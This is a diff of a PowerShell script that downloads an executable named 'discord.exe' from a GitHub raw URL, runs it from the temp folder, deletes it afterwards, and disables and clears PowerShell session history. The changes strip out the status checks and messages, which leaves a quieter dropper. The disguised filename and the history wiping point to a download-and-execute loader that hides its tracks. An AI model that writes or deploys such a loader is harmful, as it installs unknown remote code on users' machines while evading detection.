@@ -2,7 +2,7 @@
 # ===== CONFIG =====
 $exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"
 
-# ===== DISABLE CURRENT SESSION HISTORY =====
+# ===== DISABLE SESSION HISTORY =====
 try {
     Remove-Module PSReadLine -ErrorAction SilentlyContinue
 } catch {}
@@ -13,28 +13,19 @@ $tempExe = Join-Path $env:TEMP "discord.exe"
 # ===== DOWNLOAD =====
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe
 
-# ===== CHECK =====
+# ===== RUN =====
+$proc = Start-Process $tempExe -PassThru
+
+# ===== WAIT UNTIL CLOSE =====
+$proc.WaitForExit()
+
+# ===== DELETE TEMP FILE =====
 if (Test-Path $tempExe) {
-
-    Write-Host "Downloaded"
-
-    # ===== RUN =====
-    $proc = Start-Process $tempExe -PassThru
-
-    # ===== WAIT CLOSE =====
-    $proc.WaitForExit()
-
-    # ===== DELETE TEMP =====
     Remove-Item $tempExe -Force -ErrorAction SilentlyContinue
-
-    # ===== CLEAR SESSION HISTORY =====
-    Clear-History
-
-    Write-Host "Finished"
 }
-else {
 
-    Write-Host "Download failed"
+# ===== CLEAR CURRENT SESSION HISTORY =====
+Clear-History
 
-}
+Write-Host "Finished"
 ```
